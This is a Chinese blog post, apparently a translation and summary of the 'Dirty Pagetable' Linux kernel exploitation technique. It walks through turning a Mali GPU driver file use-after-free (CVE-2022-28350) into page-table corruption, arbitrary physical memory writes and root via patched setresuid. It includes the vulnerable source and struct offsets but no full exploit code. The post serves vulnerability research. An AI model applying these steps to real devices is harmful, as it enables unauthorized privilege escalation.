---
layout: post
title: Dirty Pagetable-一种新的内核漏洞利用技术
categories: Kernel-exploit
description: 利用堆漏洞（UAF/Double-Free/OOB）篡改末级页表中的PTE条目，实现任意物理地址读写。
keywords: CVE, Kernel, Exploit
---



本文来自 [Dirty Pagetable: A Novel Exploitation Technique To Rule Linux Kernel](https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html) 。

**总结**：Dirty Pagetable —— 利用堆漏洞（UAF/Double-Free/OOB）篡改末级页表中的PTE条目，实现任意物理地址读写。本文以 CVE-2023-21400 （io_uring中`io_defer_entry`对象的UAF）、CVE-2022-28350（`file` UAF）、CVE-2020-29661（`pid` UAF）为例，介绍利用方法。步骤如下：

- （1）触发UAF释放漏洞对象，并将漏洞对象所在的slab（受害者slab）还给页分配器；
- （2）分配末级用户页表来占用受害者slab（从页分配器直接分配，1 page，有512个PTE）；
- （3）利用漏洞构造原语来修改PTE，例如Double-Free（利用victim对象，`signalfd_ctx->sigmask` 存在有限制的8字节写操作，还能读出来）、UAF（利用漏洞对象`file`，调用`dup()`会递增`file->f_count`）；
- （4）将PTE改为指向内核text/data的物理地址，patch某些系统调用（例如`setresuid()` / `setresgid()`），注意需要刷新TLB；注意，需要定位该PTE对应的用户虚拟地址（从虚拟地址读，如果不等于初始化的值，则说明PTE被篡改了，可以初始化为特定值或者对应的虚拟地址），这样才能通过写入该虚拟地址来patch内核物理地址。
- （5）调用`setresuid()` / `setresgid()`提权。
  对于`file` UAF和`pid` UAF，由于只能采用递增原语来篡改PTE（不能任意篡改PTE），且mmap()分配的内存对应的物理地址大于内核text/data的物理地址，无法随意篡改内核text/data。解决办法是使PTE指向某个用户页表，通过间接篡改用户页表，来篡改物理内存。
  问题2，普通mmap()分配的物理页和页表页位于不同的物理内存，所以很难通过递增PTE使之指向另一用户页表。解决2，通过dma-buf heaps, io_uring, GPUs可以分配共享页，和用户页表位于同种内存，可以构造PTE指向共享页，利用递增原语使该PTE指向另一共享页，再通过共享页来篡改用户页表。

**脏页表简介**：Dirty Pagetalbe 是利用堆漏洞来操纵用户页表，实现任意物理地址读写。属于基于数据流的利用技术，可绕过CFI、KASLR、SMAP/PAN等。作者利用CVE-2023-21400漏洞在Google Pixel 7上实现了提权，并且，针对两种常见的漏洞开发了exploit：file UAF和pid UAF。


脏页表利用非常强，特别是对Double-Free漏洞。本文只介绍了CVE-2023-21400的提权利用，对于CVE-2021-22600[3]和CVE-2022-22265[4]，是否也可以呢？

## 3. 利用file UAF

### 3-1. file UAF现有利用方法

file UAF漏洞最近比较流行，主要有3种利用方法：

- （1）获取已释放的受害者`file`对象，供新打开的特权文件重用，例如`/etc/crontab`，之后就能写入特权文件提权。Jann Horn[1]、Mathias Krause[5]、Zhenpeng Lin[6]和作者[7]用到了本方法。缺点有3个，一是在新内核上必须赢得竞争，有一定技巧性和概率性；二是Android上无法写入高权限文件，因为这些文件位于只读文件系统中；三是无法逃逸容器。
- （2）攻击系统库或可执行文件的页缓存， Xingyu Jin、Christian Resell、Clement Lecigne、Richard Neal[8] 和 Mathias Krause[9]用到了本方法。利用该方法可向libc.so等系统库中注入恶意代码，当特权进程执行libc.so时将以特权用户的身份执行恶意代码，利用结果类似于DirtyPipe。优点是不需要竞争，稳定性较好，但是要想在Android上完整提权或逃逸容器还很复杂，且不适用于其他类型的UAF漏洞。
- （3）Cross-cache利用。Yong Wang[10]和Maddie Stone[11]都用到了本方法。提权之前都需要绕过KASLR，Yong Wang[10] 通过重复使用syscall代码来猜测 kslides 绕过了KASLR，Maddie Stone[11] 通过另一个信息泄露漏洞绕过了KASLR。绕过KASLR之后，他们伪造了一个`file`对象来构造内核读写原语。缺点是需要绕过KASLR。

### 3-2. 脏页表方法利用file UAF

以CVE-2022-28350和内核版本为5.10的Android为例，介绍Dirty Pagetable的工作原理。

#### 3-2-1. CVE-2022-28350漏洞介绍

**介绍**：位于ARM Mali GPU驱动中的 file UAF 漏洞，影响Android 12 和 Android 13。漏洞原因如下。

```c
static int kbase_kcpu_fence_signal_prepare(...) {
    ...
    /* create a sync_file fd representing the fence */
    sync_file = sync_file_create(fence_out); //<------ 创建 file 对象
    if (!sync_file) {
        ...
        ret = -ENOMEM;
        goto file_create_fail;
    }

    fd = get_unused_fd_flags(O_CLOEXEC); //<------ 获取未使用的 fd
    if (fd < 0) {
        ret = fd;
        goto fd_flags_fail;
    }

    fd_install(fd, sync_file->file); //<------ 将 file 对象和 fd 关联起来

    fence.basep.fd = fd;
    ...
    if (copy_to_user(u64_to_user_ptr(fence_info->fence), &fence,
            sizeof(fence))) {
        ret = -EFAULT;
        goto fd_flags_fail; //<------ 进入本分支
    }

    return 0;

fd_flags_fail:
    fput(sync_file->file); //<------ 释放 file 对象
file_create_fail:
    dma_fence_put(fence_out);

    return ret;
}
```

可见，调用 `fd_install()` 将 `file` 对象与 fd 关联起来。通过`copy_to_user()`将fd传递到用户空间，但如果拷贝失败，将释放 `file` 对象，导致一个有效的fd和已释放的`file`对象关联起来：

![pic14_dangling_file](/images/posts/Dirty-Pagetable/pic14_dangling_file.svg)

上图可见，受害者fd与`filp` slab上已释放的file对象相关联，详情可参见 `[7]`。释放的file对象就称为受害者file对象，其所在的slab就是受害者slab。

#### 3-2-2. 回收受害者slab

释放受害者slab上所有对象后，页分配器会回收该slab。

#### 3-2-3. 用户页表占据受害者slab

Android上 `filp` slab的大小是2-page，而用户页表大小是1-page。虽然二者大小不同，但是堆喷用户页表来占用受害者slab的成功率几乎是100%，占用成功后内存布局如下：

![pic15_occupy_slab_with_pagetable](/images/posts/Dirty-Pagetable/pic15_occupy_slab_with_pagetable.svg)

#### 3-2-4. 递增原语+定位受害者PTE对应的虚拟用户地址

**递增原语**：目的是构造写原语来篡改PTE。受害者file对象被用户页表所覆写，对该file对象进行操作可能导致内核崩溃。但是作者发现，**调用 `dup()` 将file对象的`f_count`递增1**，不会触发崩溃，问题是 `dup()` 会消耗fd资源，单个进程最多打开32768个fd，所以`f_count`最多递增32768。作者又发现`fork()+dup()`可突破该限制，先调用`fork()`，会将受害者file对象的`f_count`加1，子进程中可将`f_count`增加32768。由于可以多次重复`fork()+dup()`，所以成功突破限制。

**PTE与`f_count`重叠**：下一步是让受害者PTE的位置与`f_count`重合，这样就能利用递增原语来控制PTE。

file对象的对齐大小为320字节，`f_count`的偏移是56，占8字节

```c
(gdb) ptype /o struct file
/* offset      |    size */  type = struct file {
/*      0      |      16 */    union {
/*                     8 */        struct llist_node {
/*      0      |       8 */            struct llist_node *next;

                                       /* total size (bytes):    8 */
                                   } fu_llist;
/*                    16 */        struct callback_head {
/*      0      |       8 */            struct callback_head *next;
/*      8      |       8 */            void (*func)(struct callback_head *);

                                       /* total size (bytes):   16 */
                                   } fu_rcuhead;

                                   /* total size (bytes):   16 */
                               } f_u;
/*     16      |      16 */    struct path {
/*     16      |       8 */        struct vfsmount *mnt;
/*     24      |       8 */        struct dentry *dentry;

                                   /* total size (bytes):   16 */
                               } f_path;
/*     32      |       8 */    struct inode *f_inode;
/*     40      |       8 */    const struct file_operations *f_op;
/*     48      |       4 */    spinlock_t f_lock;
/*     52      |       4 */    enum rw_hint f_write_hint;
/*     56      |       8 */    atomic_long_t f_count;
/*     64      |       4 */    unsigned int f_flags;
......
......
/*    288      |       8 */    u64 android_oem_data1;

                               /* total size (bytes):  296 */
                             }
```

`filp` cache的slab大小为2-page，一个`filp` cache的slab中有25个`file`对象，slab的结构如下所示：

![pic16_slab_layout_of_filp](/images/posts/Dirty-Pagetable/pic16_slab_layout_of_filp.svg)

由于受害者`file`对象有25个可能的位置，为确保受害者`file`对象的`f_count`和受害者PTE恰好重合，需准备如下用户页表：

![pic17_pagetable_layout](/images/posts/Dirty-Pagetable/pic17_pagetable_layout.svg)

**识别PTE对应的用户虚拟地址**：现在我们能使受害者file对象的`f_count`与一个有效的PTE重合了，这个有效的PTE就是受害者PTE。如何找到受害者PTE对应的用户虚拟地址呢？可利用递增原语。

在利用递增原语之前，页表和相应的用户虚拟地址应该如下所示：可以看到，为了区分每个用户虚拟地址对应的物理页，作者将虚拟地址写在每个物理页的前8字节，作为标记。由于用户虚拟地址对应的所有物理页都是一次性分配的，因此它们的物理地址很可能是连续的。

![pic18_patable_and_va](/images/posts/Dirty-Pagetable/pic18_patable_and_va.svg)

如果我们利用递增原语将受害者PTE增加0x1000，就会改变与受害者PTE对应的物理页，如下所示：受害者PTE和另一个有效的PTE对应同一个物理页！现在可遍历所有虚拟页，检查前8字节是不是其虚拟地址，若不是，则该虚拟页就是受害者PTE对应的虚拟页。

